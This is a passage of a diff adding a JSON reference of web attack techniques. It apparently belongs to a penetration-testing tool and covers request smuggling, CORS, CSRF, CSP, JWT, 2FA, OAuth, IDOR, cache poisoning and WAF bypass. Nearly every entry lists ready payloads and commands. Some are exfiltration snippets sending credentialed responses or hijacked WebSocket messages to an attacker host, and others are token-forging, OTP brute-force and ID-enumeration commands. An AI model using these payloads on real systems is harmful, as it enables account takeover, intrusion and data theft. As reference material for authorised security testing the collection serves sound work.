+        {"context": "CL.TE detect", "payload": "POST / HTTP/1.1\nHost: {HOST}\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nX", "note": "Front-end uses CL, back-end uses TE; X prefix smuggled"},
+        {"context": "TE.CL detect", "payload": "POST / HTTP/1.1\nHost: {HOST}\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n", "note": "Front-end uses TE, back-end uses CL"},
+        {"context": "TE.TE (obfuscate TE)", "payload": "Transfer-Encoding: xchunked", "note": "One server parses invalid TE, the other doesn't"},
+        {"context": "CL.0 (keep-alive attack)", "payload": "Content-Length: 0", "note": "Some servers ignore CL:0 on keep-alive, treating next request as new body"}
+      ],
+      "commands": [
+        {
+          "name": "HTTP Request Smuggler (Burp)",
+          "platform": "both",
+          "category": "detection",
+          "command": "# Burp Extension: HTTP Request Smuggler; right-click → Extensions → Smuggle Probe",
+          "note": "Automated CL.TE / TE.CL / TE.TE detection; disable Update Content-Length in Repeater"
+        },
+        {
+          "name": "smuggler.py",
+          "platform": "linux",
+          "category": "detection",
+          "command": "python3 smuggler.py -u \"{URL}\"",
+          "note": "CLI tool to detect CL.TE and TE.CL vulnerabilities"
+        }
+      ],
+      "see_also": ["cors-bypass", "h2c-smuggling", "abusing-hop-by-hop-headers"]
+    },
+    "cors-bypass": {
+      "name": "CORS Misconfiguration",
+      "full_name": "CORS Misconfiguration & Bypass",
+      "description": "CORS misconfigurations allow an attacker-controlled origin to make credentialed cross-origin requests and read the responses, leading to data theft or account takeover. Common issues: reflected origin, null origin allowed, wildcard with credentials.",
+      "vuln_type": "request-manipulation",
+      "aliases": ["cors", "cors bypass", "cross origin", "cors misconfiguration"],
+      "payloads": [
+        {"context": "Reflected origin exploit", "payload": "Origin: https://evil.com", "note": "If server reflects any Origin in ACAO header, exploit with credentialed request"},
+        {"context": "Null origin bypass", "payload": "Origin: null", "note": "If null origin allowed, use sandboxed iframe: <iframe sandbox=\"allow-scripts\" src=\"data:text/html,...\">"},
+        {"context": "Subdomain exploit", "payload": "Origin: https://evil.{TARGET_DOMAIN}", "note": "If wildcard subdomain trusted; look for XSS on subdomain to chain"},
+        {"context": "eTLD+1 prefix", "payload": "Origin: https://{TARGET_DOMAIN}.evil.com", "note": "Weak origin check that uses startsWith or endsWith"}
+      ],
+      "commands": [
+        {
+          "name": "Test CORS with curl",
+          "platform": "linux",
+          "category": "detection",
+          "command": "curl -H \"Origin: https://evil.com\" -I \"{URL}\" | grep -i 'access-control'",
+          "note": "Check if evil.com origin is reflected in ACAO header"
+        },
+        {
+          "name": "Credentialed CORS exploit JS",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "fetch('https://{TARGET}/api/data', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://{ATTACKER}/?d='+btoa(d)))",
+          "note": "Host on evil.com; exfiltrates credentialed response to attacker"
+        },
+        {
+          "name": "CORScanner",
+          "platform": "linux",
+          "category": "detection",
+          "command": "python3 CORScanner.py -u \"{URL}\"",
+          "note": "Automated CORS misconfiguration scanner"
+        }
+      ],
+      "see_also": ["csrf-cross-site-request-forgery", "xss-cross-site-scripting", "content-security-policy-csp-bypass"]
+    },
+    "csrf-cross-site-request-forgery": {
+      "name": "CSRF",
+      "full_name": "Cross-Site Request Forgery (CSRF)",
+      "description": "CSRF tricks authenticated users into making unintended state-changing requests by loading attacker-controlled pages that auto-submit forms or fire requests to the target site. Effective when sessions use cookies without SameSite protection and no unpredictable tokens are required.",
+      "vuln_type": "client-side",
+      "aliases": ["csrf", "xsrf", "cross site request forgery"],
+      "payloads": [
+        {"context": "Basic CSRF form", "payload": "<form action=\"https://{TARGET}/change-email\" method=\"POST\"><input name=\"email\" value=\"attacker@evil.com\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>", "note": "Auto-submitting form; works if no CSRF token required"},
+        {"context": "GET-based CSRF", "payload": "<img src=\"https://{TARGET}/delete?id=123\">", "note": "If state-changing action uses GET; img tag fires request"},
+        {"context": "Token bypass (empty token)", "payload": "POST /action HTTP/1.1\n...\ncsrf=", "note": "Some apps accept empty token value"},
+        {"context": "Token bypass (remove param)", "payload": "POST /action HTTP/1.1\n...\n(remove csrf param entirely)", "note": "Some apps only validate token if present; omitting it skips check"},
+        {"context": "SameSite Lax bypass (top-level nav)", "payload": "<a href=\"https://{TARGET}/change-email?email=attacker@evil.com\">click</a>", "note": "SameSite=Lax allows GET cookies on top-level navigation"}
+      ],
+      "commands": [],
+      "see_also": ["cors-bypass", "clickjacking", "hacking-with-cookies"]
+    },
+    "content-security-policy-csp-bypass": {
+      "name": "CSP Bypass",
+      "full_name": "Content Security Policy (CSP) Bypass",
+      "description": "CSP restricts JS execution sources to mitigate XSS, but misconfigurations (unsafe-inline, unsafe-eval, overly broad whitelists, JSONP endpoints, trusted CDNs with upload features) can be bypassed to achieve arbitrary JavaScript execution.",
+      "vuln_type": "request-manipulation",
+      "aliases": ["csp bypass", "csp", "content security policy"],
+      "payloads": [
+        {"context": "unsafe-inline bypass", "payload": "<script>alert(1)</script>", "note": "Works if script-src includes 'unsafe-inline'"},
+        {"context": "unsafe-eval bypass", "payload": "eval('alert(1)')", "note": "Works if 'unsafe-eval' is allowed"},
+        {"context": "JSONP bypass (CDN endpoint)", "payload": "<script src=\"https://trusted-cdn.com/jsonp?callback=alert(1)\"></script>", "note": "If trusted CDN hosts JSONP endpoint"},
+        {"context": "Nonce bypass (nonce leak)", "payload": "doc.defaultView.top.document.querySelector('[nonce]').nonce", "note": "Steal nonce from page if you have limited JS execution"},
+        {"context": "Angular sandbox bypass", "payload": "{{constructor.constructor('alert(1)')()}}", "note": "If AngularJS is loaded from whitelisted source"},
+        {"context": "script-src * bypass (data: URI)", "payload": "<object data=\"data:text/html,<script>alert(1)</script>\">", "note": "If object-src not restricted; data: URI loads HTML"},
+        {"context": "base-uri bypass", "payload": "<base href=\"https://attacker.com/\">", "note": "Hijack relative URLs if base-uri directive missing"},
+        {"context": "nonce + strict-dynamic gadget", "payload": "<script nonce={NONCE}>import('https://attacker.com/xss.js')</script>", "note": "If strict-dynamic + nonce: dynamic imports from nonce-loaded script inherit trust"}
+      ],
+      "commands": [
+        {
+          "name": "CSP Evaluator",
+          "platform": "both",
+          "category": "detection",
+          "command": "# Visit https://csp-evaluator.withgoogle.com/ and paste the CSP header value",
+          "note": "Google's tool identifies weaknesses in a given CSP"
+        }
+      ],
+      "see_also": ["xss-cross-site-scripting", "cors-bypass"]
+    },
+    "clickjacking": {
+      "name": "Clickjacking",
+      "full_name": "Clickjacking (UI Redressing)",
+      "description": "Clickjacking overlays a transparent iframe of a target site over a decoy page, tricking users into clicking buttons on the target without realizing it. Effective when X-Frame-Options or frame-ancestors CSP is not set.",
+      "vuln_type": "client-side",
+      "aliases": ["clickjacking", "ui redressing", "iframe overlay"],
+      "payloads": [
+        {"context": "Basic clickjacking", "payload": "<style>iframe{position:absolute;width:500px;height:700px;opacity:0.0001;z-index:2;}div{position:absolute;top:300px;left:60px;z-index:1;}</style><div>Click me!</div><iframe src=\"https://{TARGET}/sensitive-action\"></iframe>", "note": "Invisible iframe over decoy; adjust top/left to align buttons"},
+        {"context": "Prepopulated form", "payload": "<iframe src=\"https://{TARGET}/email?email=attacker@evil.com\"></iframe>", "note": "Pre-fill form fields via GET params then overlay submit button"},
+        {"context": "Drag-and-drop attack", "payload": "# Use drag-and-drop to extract tokens from iframe content into attacker-controlled form", "note": "Bypasses same-origin policy for extracting tokens via user interaction"}
+      ],
+      "commands": [
+        {
+          "name": "Check X-Frame-Options header",
+          "platform": "linux",
+          "category": "detection",
+          "command": "curl -sI \"{URL}\" | grep -i 'x-frame-options\\|content-security-policy'",
+          "note": "Check for frame-ancestors or X-Frame-Options protection"
+        }
+      ],
+      "see_also": ["csrf-cross-site-request-forgery", "xss-cross-site-scripting"]
+    },
+    "idor": {
+      "name": "IDOR",
+      "full_name": "Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization",
+      "description": "IDOR occurs when an application exposes user-controllable references to internal objects (IDs, filenames, UUIDs) without checking authorization, enabling horizontal or vertical privilege escalation and mass data exfiltration.",
+      "vuln_type": "access-control",
+      "aliases": ["idor", "bola", "broken object level authorization", "insecure direct object reference", "authorization bypass"],
+      "payloads": [
+        {"context": "Sequential ID increment", "payload": "GET /api/user/1337", "note": "Change your ID to another user's ID; look for numeric sequential IDs"},
+        {"context": "UUID/GUID substitution", "payload": "GET /files/550e8400-e29b-41d4-a716-446655440000", "note": "Enumerate or predict UUIDs"},
+        {"context": "Horizontal privilege test", "payload": "PUT /api/lead/target-id", "note": "Use your auth token but reference another user's object"},
+        {"context": "JSON body object ID", "payload": "{\"user_id\": 1, \"action\": \"delete\"}", "note": "Change user_id in JSON body while keeping your session"}
+      ],
+      "commands": [
+        {
+          "name": "IDOR enumeration with ffuf",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "ffuf -u \"{BASE_URL}/api/user/FUZZ\" -w <(seq 1 10000) -H \"Cookie: {SESSION}\" -fr 'not found' -o hits.json",
+          "note": "Enumerate numeric IDs; filter out 'not found' responses"
+        },
+        {
+          "name": "IDOR enumeration with curl loop",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "for id in $(seq 1 1000); do curl -s -H \"Cookie: {SESSION}\" \"{BASE_URL}/api/user/$id\" | jq -e '.email' && echo \"Hit: $id\"; done",
+          "note": "Simple shell loop to enumerate IDOR and print found emails"
+        }
+      ],
+      "see_also": ["mass-assignment-cwe-915", "account-takeover", "oauth-to-account-takeover"]
+    },
+    "mass-assignment-cwe-915": {
+      "name": "Mass Assignment",
+      "full_name": "Mass Assignment (CWE-915)",
+      "description": "Mass assignment occurs when an API or ORM automatically binds request parameters to model attributes without a whitelist, allowing attackers to set privileged fields (e.g. isAdmin, role, credit) by including them in user-supplied JSON or form data.",
+      "vuln_type": "access-control",
+      "aliases": ["mass assignment", "auto binding", "parameter binding", "object injection"],
+      "payloads": [
+        {"context": "Add admin flag in JSON", "payload": "{\"username\":\"user\",\"password\":\"pass\",\"isAdmin\":true}", "note": "Add privilege-escalating fields to registration/update requests"},
+        {"context": "Add role field", "payload": "{\"name\":\"user\",\"role\":\"admin\"}", "note": "Attempt to set role via API"},
+        {"context": "Add credits/balance", "payload": "{\"item\":\"shirt\",\"credit\":999999}", "note": "Try to add financial attributes"},
+        {"context": "Nested object assignment", "payload": "{\"user\":{\"name\":\"x\",\"__admin\":1}}", "note": "Ruby/Rails nested attributes may be recursively assigned"}
+      ],
+      "commands": [],
+      "see_also": ["idor", "access-control"]
+    },
+    "hacking-jwt-json-web-tokens": {
+      "name": "JWT Attacks",
+      "full_name": "JWT (JSON Web Token) Vulnerabilities",
+      "description": "JWT attacks exploit weaknesses in JSON Web Token implementation including algorithm confusion (RS256→HS256), weak secrets, missing signature validation, alg:none, and kid header injection to forge tokens and escalate privileges.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["jwt", "json web token", "jwt attack", "alg none", "algorithm confusion"],
+      "payloads": [
+        {"context": "alg:none attack", "payload": "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"sub\":\"admin\",\"role\":\"admin\"}.", "note": "Remove signature and set alg to none; some libraries accept it"},
+        {"context": "Algorithm confusion (RS256→HS256)", "payload": "# Sign HS256 token using public key as HMAC secret", "note": "If server uses RS256 but accepts HS256; sign with public key bytes"},
+        {"context": "Weak secret brute-force", "payload": "# Secret: 'secret', 'password', 'key', '123456', application name", "note": "Common weak JWT secrets to try offline cracking"},
+        {"context": "kid header SQLi", "payload": "{\"kid\":\"' UNION SELECT 'attacker-secret'--\"}", "note": "If kid parameter is used in SQL query; inject known secret"},
+        {"context": "kid header path traversal", "payload": "{\"kid\":\"../../../dev/null\"}", "note": "If kid points to file; /dev/null gives empty secret → sign with empty string"}
+      ],
+      "commands": [
+        {
+          "name": "jwt_tool all attacks",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 jwt_tool.py -M at -t \"{URL}\" -rh \"Authorization: Bearer {JWT}\"",
+          "note": "Run all attack modes against target endpoint"
+        },
+        {
+          "name": "hashcat JWT cracking",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "hashcat -a 0 -m 16500 {JWT_FILE} /usr/share/wordlists/rockyou.txt",
+          "note": "Offline HMAC secret cracking; mode 16500 for HS256/384/512"
+        },
+        {
+          "name": "jwt_tool brute-force secret",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 jwt_tool.py {JWT} -C -d /usr/share/wordlists/rockyou.txt",
+          "note": "Brute-force HMAC secret with wordlist"
+        }
+      ],
+      "see_also": ["oauth-to-account-takeover", "2fa-bypass", "saml-attacks"]
+    },
+    "2fa-bypass": {
+      "name": "2FA Bypass",
+      "full_name": "Two-Factor Authentication Bypass (2FA/MFA/OTP)",
+      "description": "2FA bypass techniques exploit logic flaws in MFA implementation including direct endpoint access, token reuse, rate limit bypass, response manipulation, and race conditions to authenticate without the second factor.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["2fa bypass", "mfa bypass", "otp bypass", "totp bypass", "two factor bypass"],
+      "payloads": [
+        {"context": "Direct endpoint access", "payload": "GET /dashboard (skip 2FA step)", "note": "After first-factor auth, directly access post-login pages; skip /verify-otp"},
+        {"context": "Token reuse", "payload": "# Reuse a previously used OTP", "note": "Some apps don't invalidate used OTPs; replay old code"},
+        {"context": "Cross-account token", "payload": "# Use OTP from your account to bypass another account's 2FA", "note": "OTPs from same TOTP seed/shared secret logic"},
+        {"context": "Empty OTP bypass", "payload": "otp=", "note": "Some apps accept empty OTP value; skip validation"},
+        {"context": "Response manipulation", "payload": "# Intercept 2FA failed response; change 'success':false to 'success':true", "note": "Client-side 2FA check; Burp intercept and modify response"},
+        {"context": "Brute-force 6-digit OTP", "payload": "# 000000 to 999999 (1M combinations)", "note": "If no rate limiting; look for 4-digit OTPs (10k combinations)"}
+      ],
+      "commands": [
+        {
+          "name": "Burp Intruder OTP brute-force",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "# Burp Intruder: Sniper on OTP field; Payload: Numbers 000000-999999; check for rate limiting first",
+          "note": "Also check if rate limit resets on resend"
+        }
+      ],
+      "see_also": ["oauth-to-account-takeover", "hacking-jwt-json-web-tokens", "reset-password"]
+    },
+    "oauth-to-account-takeover": {
+      "name": "OAuth Attacks",
+      "full_name": "OAuth to Account Takeover",
+      "description": "OAuth implementation flaws including open redirect in redirect_uri, state CSRF, token leakage via Referer, and authorization code interception can lead to account takeover by stealing OAuth tokens or hijacking the authorization flow.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["oauth", "oauth attack", "oauth takeover", "oauth bypass"],
+      "payloads": [
+        {"context": "Open redirect_uri", "payload": "redirect_uri=https://attacker.com/callback", "note": "If redirect_uri not strictly validated; intercept auth code"},
+        {"context": "redirect_uri path traversal", "payload": "redirect_uri=https://legit.com/../../../attacker.com", "note": "Path traversal in redirect_uri"},
+        {"context": "State CSRF (missing state)", "payload": "# Initiate OAuth flow without state param; send to victim", "note": "If state not validated, can force login to attacker's account (login CSRF)"},
+        {"context": "Token leakage via Referer", "payload": "# Place victim's OAuth callback URL in img src on attacker page", "note": "Fragment (#) tokens don't leak via Referer; query params do"},
+        {"context": "Implicit flow token steal", "payload": "# Use postMessage or open() to steal fragment token from redirect", "note": "Implicit flow embeds token in URL fragment accessible to JS"}
+      ],
+      "commands": [],
+      "see_also": ["2fa-bypass", "hacking-jwt-json-web-tokens", "account-takeover", "saml-attacks"]
+    },
+    "account-takeover": {
+      "name": "Account Takeover",
+      "full_name": "Account Takeover (ATO)",
+      "description": "Account takeover encompasses multiple attack paths including password reset flaws, username/email normalization, OAuth issues, session fixation, and credential stuffing that result in unauthorized access to user accounts.",
+      "vuln_type": "access-control",
+      "aliases": ["account takeover", "ato"],
+      "payloads": [
+        {"context": "Unicode normalization bypass", "payload": "attacker＠victim.com", "note": "Fullwidth @ (U+FF20) may normalize to regular @ in some systems"},
+        {"context": "Email case manipulation", "payload": "VICTIM@EXAMPLE.COM", "note": "If case-insensitive email matching not consistent between registration and login"},
+        {"context": "Plus tag bypass", "payload": "victim+attacker@gmail.com", "note": "If app strips plus-tags differently between components"}
+      ],
+      "commands": [],
+      "see_also": ["oauth-to-account-takeover", "reset-password", "registration-vulnerabilities", "idor"]
+    },
+    "reset-password": {
+      "name": "Password Reset Flaws",
+      "full_name": "Password Reset Vulnerabilities",
+      "description": "Password reset vulnerabilities include predictable/guessable tokens, token not expiring, host header injection in reset emails, race conditions on token use, and accepting reset without verifying account ownership.",
+      "vuln_type": "auth-bypass",
+      "aliases": ["password reset", "forgot password", "reset token"],
+      "payloads": [
+        {"context": "Host header injection in reset", "payload": "Host: attacker.com", "note": "If password reset email uses Host header to build reset URL; link goes to attacker"},
+        {"context": "Weak reset token", "payload": "# md5(username+timestamp) or sequential tokens", "note": "Analyze token entropy; try to predict or brute-force"},
+        {"context": "Token not expired", "payload": "# Reuse old password reset token after password already changed", "note": "Tokens should be single-use and time-limited"},
+        {"context": "Username collision", "payload": "# Register attacker@example.com when victim is victim@example.com", "note": "Race condition or TOCTOU in username normalization"}
+      ],
+      "commands": [],
+      "see_also": ["2fa-bypass", "account-takeover", "registration-vulnerabilities"]
+    },
+    "hacking-with-cookies": {
+      "name": "Cookie Attacks",
+      "full_name": "Cookie Security & Attack Techniques",
+      "description": "Cookie attacks exploit misconfigured cookie attributes (missing HttpOnly, Secure, SameSite) and application logic to steal, forge, or abuse session cookies for session hijacking, CSRF, and cross-subdomain attacks.",
+      "vuln_type": "client-side",
+      "aliases": ["cookies", "cookie attack", "cookie theft", "session fixation", "cookie tossing"],
+      "payloads": [
+        {"context": "Cookie tossing (subdomain)", "payload": "Set-Cookie: session=forged; Domain=.example.com; Path=/", "note": "From subdomain, set cookie for parent domain to override session"},
+        {"context": "Cookie bomb DoS", "payload": "# Set many large cookies to exceed browser limit; page becomes inaccessible", "note": "Forces browser to send oversized Cookie header → 400/431 errors"},
+        {"context": "Session fixation", "payload": "Set-Cookie: PHPSESSID=attacker-chosen-value", "note": "Pre-set session ID before victim logs in; if server reuses it, attacker gains access"}
+      ],
+      "commands": [],
+      "see_also": ["csrf-cross-site-request-forgery", "xss-cross-site-scripting"]
+    },
+    "open-redirect": {
+      "name": "Open Redirect",
+      "full_name": "Open Redirect",
+      "description": "Open redirects occur when an application redirects users to a URL from user-controlled input without validation, enabling phishing, token theft via Referer, and chaining with SSRF or OAuth attacks.",
+      "vuln_type": "misc",
+      "aliases": ["open redirect", "unvalidated redirect", "redirect bypass"],
+      "payloads": [
+        {"context": "Basic redirect", "payload": "?redirect=https://evil.com", "note": "Check common params: next, url, redirect, return, goto, dest, destination"},
+        {"context": "Protocol bypass", "payload": "?redirect=//evil.com", "note": "Protocol-relative URL; browser uses current scheme"},
+        {"context": "Encoded bypass", "payload": "?redirect=https:%2F%2Fevil.com", "note": "URL-encoded slashes may bypass filter"},
+        {"context": "Domain confusion", "payload": "?redirect=https://example.com.evil.com", "note": "If filter checks startsWith('https://example.com')"},
+        {"context": "@-based bypass", "payload": "?redirect=https://example.com@evil.com", "note": "@ is interpreted as userinfo separator; redirects to evil.com"},
+        {"context": "Fragment bypass", "payload": "?redirect=https://evil.com#https://example.com", "note": "If validation only checks for example.com being present"},
+        {"context": "CRLF in redirect", "payload": "?redirect=https://evil.com%0d%0aSet-Cookie:session=attacker", "note": "Chain with CRLF injection for header injection"}
+      ],
+      "commands": [],
+      "see_also": ["ssrf-server-side-request-forgery", "oauth-to-account-takeover"]
+    },
+    "crlf-0d-0a": {
+      "name": "CRLF Injection",
+      "full_name": "CRLF Injection (HTTP Response Splitting)",
+      "description": "CRLF injection inserts carriage-return/line-feed characters into HTTP headers, enabling header injection, response splitting, XSS via injected scripts, session fixation, and cache poisoning.",
+      "vuln_type": "request-manipulation",
+      "aliases": ["crlf injection", "crlf", "http response splitting", "header injection"],
+      "payloads": [
+        {"context": "Basic header inject", "payload": "%0d%0aX-Injected-Header: malicious", "note": "CRLF in URL/param reflected in response headers"},
+        {"context": "Set-Cookie injection", "payload": "%0d%0aSet-Cookie: session=attacker", "note": "Inject Set-Cookie header for session fixation"},
+        {"context": "XSS via response split", "payload": "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>", "note": "Split response and inject HTML body"},
+        {"context": "Location header bypass", "payload": "https://victim.com%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK", "note": "Inject false 200 response after redirect"}
+      ],
+      "commands": [
+        {
+          "name": "CRLFuzz scanner",
+          "platform": "linux",
+          "category": "detection",
+          "command": "crlfuzz -u \"{URL}\"",
+          "note": "Fast CRLF injection scanner written in Go"
+        }
+      ],
+      "see_also": ["http-request-smuggling", "cors-bypass", "open-redirect"]
+    },
+    "abusing-hop-by-hop-headers": {
+      "name": "Hop-by-Hop Header Abuse",
+      "full_name": "Abusing Hop-by-Hop Headers",
+      "description": "Hop-by-hop headers (listed in the Connection header) are stripped by proxies. By specifying security-relevant headers as hop-by-hop, attackers can cause back-end servers to receive requests without those headers, bypassing auth checks or security controls.",
+      "vuln_type": "request-manipulation",
+      "aliases": ["hop by hop", "hop-by-hop", "connection header abuse"],
+      "payloads": [
+        {"context": "Strip authorization header", "payload": "Connection: keep-alive, X-Forwarded-For, Authorization", "note": "List Authorization as hop-by-hop; back-end receives request without auth"},
+        {"context": "Strip X-Auth header", "payload": "Connection: X-Custom-Auth", "note": "Remove custom auth headers that proxy would forward"},
+        {"context": "IP spoofing via hop-by-hop", "payload": "Connection: X-Forwarded-For\nX-Forwarded-For: 127.0.0.1", "note": "Strip XFF; if back-end adds it, spoofed IP reaches back-end"}
+      ],
+      "commands": [],
+      "see_also": ["http-request-smuggling", "cors-bypass", "proxy-waf-protections-bypass"]
+    },
+    "h2c-smuggling": {
+      "name": "H2C Smuggling",
+      "full_name": "HTTP/2 Cleartext (H2C) Smuggling",
+      "description": "H2C smuggling abuses proxy misconfiguration where the proxy treats Connection: Upgrade as hop-by-hop but passes the Upgrade: h2c to the back-end, allowing the attacker to establish an HTTP/2 tunnel that bypasses proxy-enforced access controls.",
+      "vuln_type": "request-manipulation",
+      "aliases": ["h2c smuggling", "http2 smuggling", "upgrade h2c"],
+      "payloads": [
+        {"context": "H2C upgrade request", "payload": "GET / HTTP/1.1\nHost: {TARGET}\nUpgrade: h2c\nHTTP2-Settings: AAMAAABkAAQAAP__\nConnection: Upgrade, HTTP2-Settings", "note": "If proxy passes Upgrade to back-end, HTTP/2 tunnel established"}
+      ],
+      "commands": [
+        {
+          "name": "h2csmuggler tool",
+          "platform": "linux",
+          "category": "exploitation",
+          "command": "python3 h2csmuggler.py --scan-list targets.txt -x \"/internal/admin\"",
+          "note": "Detect H2C smuggling and access internal endpoints"
+        }
+      ],
+      "see_also": ["http-request-smuggling", "abusing-hop-by-hop-headers"]
+    },
+    "race-condition": {
+      "name": "Race Condition",
+      "full_name": "Race Condition Vulnerabilities",
+      "description": "Race conditions exploit timing windows in multi-step operations to apply coupons multiple times, bypass rate limits, double-spend credits, or bypass checks that assume sequential execution of concurrent requests.",
+      "vuln_type": "misc",
+      "aliases": ["race condition", "toctou", "time of check time of use", "concurrency issue"],
+      "payloads": [
+        {"context": "Coupon/gift card double-use", "payload": "# Send 20+ parallel requests applying same coupon simultaneously", "note": "Use Burp Repeater 'Send group (parallel)' or Turbo Intruder"},
+        {"context": "Balance/credit double-spend", "payload": "# Concurrent withdrawal requests exceeding balance", "note": "Check-then-act pattern vulnerable to concurrent exploitation"},
+        {"context": "2FA race condition", "payload": "# Send multiple OTP verification requests in parallel", "note": "Rate limit check may not be atomic"}
+      ],
+      "commands": [
+        {
+          "name": "Burp Turbo Intruder race condition",
+          "platform": "both",
+          "category": "exploitation",
+          "command": "# Burp: Extensions → Turbo Intruder → race-single-packet-attack.py template\n# Adjust concurrency; Burp 2023.9+ has built-in 'Send group (parallel)' in Repeater",
+          "note": "HTTP/2 single-packet attack sends all requests in one TCP frame to minimize timing variance"
+        }
+      ],
+      "see_also": ["2fa-bypass", "idor"]
+    },
+    "regular-expression-denial-of-service-redos": {
+      "name": "ReDoS",
+      "full_name": "Regular Expression Denial of Service (ReDoS)",
+      "description": "ReDoS exploits catastrophically backtracking regular expressions by crafting input that causes O(2^n) or O(n^2) backtracking, resulting in server-side CPU exhaustion and denial of service.",
+      "vuln_type": "misc",
+      "aliases": ["redos", "regex dos", "regex denial of service"],
+      "payloads": [
+        {"context": "Evil regex (email validation)", "payload": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!", "note": "Pattern like (a+)+ triggers exponential backtracking on mismatch"},
+        {"context": "Evil regex (nested groups)", "payload": "aaaaaaaaaaaaaaaaaaaaaaac", "note": "Pattern like (a|a)+ causes catastrophic backtracking"}
+      ],
+      "commands": [
+        {
+          "name": "vuln-regex-detector",
+          "platform": "linux",
+          "category": "detection",
+          "command": "node vuln-regex-detector/src/detect/detect-vuln-regex.js \"{REGEX}\"",
+          "note": "Analyze regex patterns for catastrophic backtracking"
+        }
+      ],
+      "see_also": ["race-condition"]
+    },
+    "websocket-attacks": {
+      "name": "WebSocket Attacks",
+      "full_name": "WebSocket Security Testing",
+      "description": "WebSocket attacks exploit the persistent bidirectional channel including cross-site WebSocket hijacking (CSWSH), injection via messages, authentication bypass, and smuggling attacks targeting WebSocket upgrade requests.",
+      "vuln_type": "misc",
+      "aliases": ["websocket", "ws attack", "cross-site websocket hijacking", "cswsh"],
+      "payloads": [
+        {"context": "Cross-site WebSocket hijacking", "payload": "<script>ws=new WebSocket('wss://{TARGET}/chat');ws.onmessage=e=>fetch('https://{ATTACKER}/?d='+e.data)</script>", "note": "If WS doesn't validate Origin; reads messages from victim's authenticated session"},
+        {"context": "XSS via WS message", "payload": "{\"message\":\"<img src=x onerror=alert(1)>\"}", "note": "If WS messages are rendered as HTML without sanitization"},
+        {"context": "SQLi in WS message", "payload": "{\"query\":\"' OR 1=1--\"}", "note": "SQL injection through WebSocket message fields"}
+      ],
+      "commands": [],
+      "see_also": ["xss-cross-site-scripting", "cors-bypass", "csrf-cross-site-request-forgery"]
+    },
+    "parameter-pollution": {
+      "name": "HTTP Parameter Pollution",
+      "full_name": "HTTP Parameter Pollution (HPP)",
+      "description": "HTTP Parameter Pollution sends multiple values for the same parameter, exploiting how different components (WAF vs app server) handle duplicate parameters to bypass security controls or alter application logic.",
+      "vuln_type": "misc",
+      "aliases": ["hpp", "parameter pollution", "http parameter pollution"],
+      "payloads": [
+        {"context": "Duplicate param bypass (WAF)", "payload": "?id=1&id=2", "note": "WAF may check first param; app may use last (or vice versa)"},
+        {"context": "Array syntax bypass", "payload": "?id[]=1&id[]=2", "note": "PHP/Ruby may treat as array; WAF may not recognize"},
+        {"context": "Comma-separated", "payload": "?id=1,2", "note": "Some parsers treat comma as array separator"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "cors-bypass", "proxy-waf-protections-bypass"]
+    },
+    "proxy-waf-protections-bypass": {
+      "name": "WAF Bypass",
+      "full_name": "Proxy/WAF Protections Bypass",
+      "description": "WAF bypass techniques use encoding, case variation, whitespace obfuscation, and HTTP parsing quirks to make malicious payloads reach the back-end application while evading WAF detection.",
+      "vuln_type": "misc",
+      "aliases": ["waf bypass", "proxy bypass", "filter bypass", "firewall bypass"],
+      "payloads": [
+        {"context": "URL double encoding", "payload": "%2527 (double encoded ')", "note": "Bypass WAFs that decode once; app decodes twice"},
+        {"context": "HTML entity encoding (XSS)", "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", "note": "HTML entities; browser decodes before JS execution"},
+        {"context": "Case variation (SQLi)", "payload": "sElEcT * fRoM uSeRs", "note": "SQL keywords mixed case; some WAFs use case-sensitive patterns"},
+        {"context": "Whitespace substitution", "payload": "SELECT/**/FROM/**/users", "note": "Replace spaces with comments to bypass space-based WAF rules"},
+        {"context": "Unicode lookalike bypass", "payload": "ꓱLECT * FROM users", "note": "Unicode homoglyphs for keywords"},
+        {"context": "Chunked transfer bypass", "payload": "# Send payload split across multiple chunks", "note": "Some WAFs reassemble chunks differently than the app server"},
+        {"context": "X-Forwarded-For 127.0.0.1", "payload": "X-Forwarded-For: 127.0.0.1", "note": "Bypass IP-based WAF rules that whitelist localhost"}
+      ],
+      "commands": [],
+      "see_also": ["sql-injection", "xss-cross-site-scripting", "command-injection"]
+    },
+    "cache-deception": {
+      "name": "Web Cache Deception",
+      "full_name": "Web Cache Deception & Cache Poisoning",
+      "description": "Cache deception tricks a cache into storing a user's private response under a URL accessible to attackers. Cache poisoning injects malicious content into a cache to serve it to other users by exploiting unkeyed inputs.",
+      "vuln_type": "misc",
+      "aliases": ["cache deception", "cache poisoning", "web cache poisoning"],
+      "payloads": [
+        {"context": "Cache deception path suffix", "payload": "https://{TARGET}/profile.css", "note": "If /profile serves private data and .css is cached; trick victim to visit this URL"},
+        {"context": "Cache poisoning (X-Forwarded-Host)", "payload": "X-Forwarded-Host: attacker.com", "note": "If host header reflected in cached response; poisons cache with attacker domain"},
+        {"context": "Cache key normalization", "payload": "https://{TARGET}/js/app.js?cb=1&evil=<script>alert(1)</script>", "note": "If query params not in cache key but reflected in response"},
+        {"context": "Fat GET request", "payload": "GET /search?q=normal HTTP/1.1\n\nq=<script>alert(1)</script>", "note": "Some servers process body in GET; some caches ignore body in cache key"}
+      ],
+      "commands": [],
+      "see_also": ["xss-cross-site-scripting", "cors-bypass", "http-request-smuggling"]
+    },
+    "saml-attacks": {
+      "name": "SAML Attacks",
+      "full_name": "SAML Authentication Attacks",
